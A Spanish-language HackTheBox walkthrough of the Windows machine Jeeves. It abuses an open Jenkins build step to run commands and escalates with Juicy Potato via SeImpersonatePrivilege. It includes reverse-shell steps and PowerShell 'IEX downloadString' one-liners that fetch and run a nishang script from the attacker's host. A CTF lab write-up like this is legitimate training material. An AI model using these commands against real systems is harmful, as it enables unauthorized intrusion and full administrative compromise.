---
title:  "Jeeves Writeup [ES] - HackTheBox"
date:   2021-11-01 17:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [medium, jenkins, privesc]
---

[Jeeves](https://app.hackthebox.com/machines/114) es una máquina **Windows** de dificultad media ofrecida por la plataforma de [Hack The Box](https://app.hackthebox.com/). A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.


## Información


![Info](/images/HTB/Jeeves/01-info.png)


## Enumeración

### NMAP

Como siempre, partiremos realizando un escaneo general de los 65535 puertos.

* ```nmap -sS -p- --min-rate 4000 -v -n -Pn 10.10.10.63 -oG allPorts.gnmap```

```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 21:01 -03
Nmap scan report for 10.10.10.63
Host is up (0.15s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 33.08 seconds
```

Posteriormente realizamos un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados.

* ```nmap -sC -sV -p80,135,445,50000 -n -v  10.10.10.63 -oN ports.nmap```


```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 21:06 -03
Nmap scan report for 10.10.10.63
Host is up (0.15s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h13m41s, deviation: 0s, median: 5h13m40s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-02T05:20:15
|_  start_date: 2021-11-02T05:13:21

Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
```

### Enumeración web

Partimos por verificar lo que nos encontramos en los puertos 80 y 5000. 

* ```whatweb http://10.10.10.63```
* ```whatweb http://10.10.10.63:5000```

![](/images/HTB/Jeeves/05-enumeracion-web.png)

#### http://10.10.10.63

En el home nos encontramos con esta página que nos invita a utilizar el buscador Ask Jeeves.

![](/images/HTB/Jeeves/15-web1.png)

Sin embargo, al darle al botón **Search** nos redirige a https://10.10.10.63/error.html y nos arroja un error.

![](/images/HTB/Jeeves/16-web2.png)

Al darle un vistazo al código fuente, nos enteramos que es una imagen estática que se consulta.

![](/images/HTB/Jeeves/17-web3.png)

Como no se ve nada más que pueda ser de interés, lo siguiente será realizar **fuzzing** sobre esta ruta. Para ello, en esta ocasión utilizaré [Feroxbuster](https://github.com/epi052/feroxbuster) el cual es un fuzzer recursivo, buena alternativa de gobuster/wfuzz.

* ```./feroxbuster --url http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300```

![](/images/HTB/Jeeves/11-0-feroxbuster.png)

Y en este caso no encontramos nada adicional, por lo tanto, es tiempo de avanzar. Realizaremos el mismo proceso sobre el web server del puerto 50000

#### http://10.10.10.63:50000

Bajo esta ruta nos encontramos un home con una página de error. Además de un mensaje que nos indica la versión de jetty y un enlace que nos redirige a http://www.eclipse.org/jetty/

![](/images/HTB/Jeeves/20-secondary-webserver.png)

Nuevamente no hay mucho más que ver, por lo tanto es hora del **fuzzing**.

* ```./feroxbuster --url http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300```

![](/images/HTB/Jeeves/11-feroxbuster.png)

Vemos que esta vez si tuvimos suerte y Feroxbuster nos proporciona la ruta http://10.10.10.63:50000/askjeeves como válida. Consultando el recurso visualizamos lo siguiente.

![](/images/HTB/Jeeves/25-jenkins.png)

Un **Jenkins** de versión 2.87. Como primer paso buscamos vulnerabilidades asociadas en exploitdb sin tener éxito.


## Ganando acceso

Siguiendo adelante, intentaremos crear un proyecto nuevo para verificar si tenemos algún permiso de ejecución de tareas.

![](/images/HTB/Jeeves/25.1-create-project.png)

En la sección **Build** especificamos que durante la ejecución de la tarea, queremos lanzar comandos de Windows.

![](/images/HTB/Jeeves/25.2-configure-project.png)

En primera instancia ejecutaremos un ping hacia nuestra IP para verificar si es posible ejecutar comandos.

![](/images/HTB/Jeeves/25.30-ping-command.png)

Una vez que escribimos la instrucción, guardamos el proyecto y le damos a **Build Now**.

![](/images/HTB/Jeeves/25.4-execute-command.png)

Posteriormente veremos una entrada en el **Build history**, clikamos ahí y entraremos al detalle de la ejecución de nuestra tarea.

![](/images/HTB/Jeeves/25.6-execute-command.png)

Vamos a **Console Output** y validamos que efectivamente el ping se emitió sin problemas.

![](/images/HTB/Jeeves/25.5-execute-command.png)

Ya esta vez intentaremos obtener nuestra reverse shell utilizando netcat compartido a través de un recurso en red SMB. Primero disponibilizamos el binario utilizando impacket.

* ```impacket-smbserver SharedFolder . -smb2support```


![](/images/HTB/Jeeves/29-impacket.png)


Paralelamente iniciamos un canal de escucha para el puerto 443.

![](/images/HTB/Jeeves/30.5-reverse-shell-listener.png)



Modificamos la tarea para incluir la instrucción de generar una reverse shell hacia nuestra máquina por el puerto 443.

![](/images/HTB/Jeeves/25.3-shell-command.png)

Le damos a **Build Now** y veremos que obtendremos nuestra conexión.


![](/images/HTB/Jeeves/30-sharedfolder-reverse.png)

Tenemos acceso con el usuario **kohsuke**

## Escalando privilegios

### Preparativos


Antes de realizar la escalada de privilegios, realizaremos el mismo proceso anterior para obtener una reverse shell, pero en este caso, usaremos [nishang](https://github.com/samratashok/nishang) para obtener una consola PowerShell. Estos son los pasos:

* Clonar el repositorio ```git clone https://github.com/samratashok/nishang```
* Ir a *nishang/shells*, editar archivo ```Invoke-PowerShellTcp.ps1``` y añadir ```Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 8001``` al final del script.
* Mover el archivo a nuestro directorio de trabajo y renombrarlo como IPS.ps1.
* Montar un servidor web para compartir dicho archivo ```python3 -m http.server 80```.
* Ponernos a la escucha de tráfico a través del puerto 8001.
* Ejecutar nueva tarea de **Jenkins** para obtener consola Powershell.

```powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/IPS.ps1')```

![](/images/HTB/Jeeves/34-powershell-reverse.png)

![](/images/HTB/Jeeves/35-powershell-reverse.png)

### Reconocimiento

Ya en este punto, lo primero a realizar es un reconocimiento del sistema, para saber con que S.O. estamos tratando, que usuario somos y que permisos tenemos asignados.

* ```systeminfo```

![](/images/HTB/Jeeves/40-systeminfo.png)

* ```whoami /priv```

![](/images/HTB/Jeeves/45-whoami-priv.png)

Validamos que estamos en una máquina **Windows 10 Pro de 64 bits** y ésta mantiene el permiso ```SeImpersonatePrivilege``` habilitado. Sabiendo esto, podríamos intentar utilizar [Juicy Potato](https://github.com/ohpe/juicy-potato) para explotarlo.

### Explotación

Primero descargamos el binario de Juicy Potato desde [Releases](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) y lo llevamos a la máquina víctima utilizando impacket.

![](/images/HTB/Jeeves/50-copy-juicy.png)

El binario se ha exportado a la ruta ```C:\Users\Public``` con el nombre de ```JP.exe```.

Reverse shell con **powershell**
* ```.\JP.exe -t * -l 1337 -p cmd.exe -a "/c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/IPS.ps1')"```

Al igual que antes, compartiremos el archivo ```IPS.ps1``` con un servidor web en **python3**, previamente configurado para entablar una conexión hacia nuestra IP por el puerto 8002.

![](/images/HTB/Jeeves/55-admin-reverse.png)

Al obtener la consola, ya seríamos **NT AUTHORITY\SYSTEM**. Ahora solo restaría encontrar las flags, leer su contenido e ingresarlas en la plataforma de HTB.

## user.txt

Buscar archivos con **powershell**
* ```Get-ChildItem -Path C:\ -Recurse -Include user.txt```

![](/images/HTB/Jeeves/60-user.txt.png)

Variación para obtener la ruta completa del archivo.
* ```Get-ChildItem -Path C:\ -Recurse -Include user.txt | select FullName```

![](/images/HTB/Jeeves/65-user.txt-full.png)

Leyendo la flag user.txt

* ```type C:\Users\kohsuke\Desktop\user.txt```

![](/images/HTB/Jeeves/70-read-user.txt.png)

## root.txt

Para esta flag la cosa se complica un poco, ya que no la encontraremos por métodos convencionales. Al buscar por todos los archivos con extensión ```.txt``` dentro del home del usuario **Administrator** encontraremos un archivo interesante.

![](/images/HTB/Jeeves/71-admin-txt-files.png)

Al leer ```hm.txt``` veremos lo siguiente.

> The flag is elsewhere. Look deeper.

![](/images/HTB/Jeeves/72-root-hint.png)

Después de muchos intentos y buscar información con el confiable **Google** llegamos a un [artículo](https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams/) que explica como esconder información en un archivo utilizando ***ADS - Alternate Data Streams***. También explica como extraer información de estos streams.

1. Utilizando ```Get-Item``` buscaremos todos los streams de manera recursiva en la ruta ```C:\Users\Administrator\Desktop```.
    * ```Get-Item C:\Users\Administrator\Desktop\*.txt -stream *```
2. Obtendremos el contenido con ```Get-Content``` especificando el nombre del stream que queremos leer.
   * ```Get-Content hm.txt -stream root.txt```

![](/images/HTB/Jeeves/75-read-root.txt.png)

Como se ve en la imagen, el archivo ```hm.txt``` contenía un stream llamado ```root.txt``` con el hash de la flag en su interior.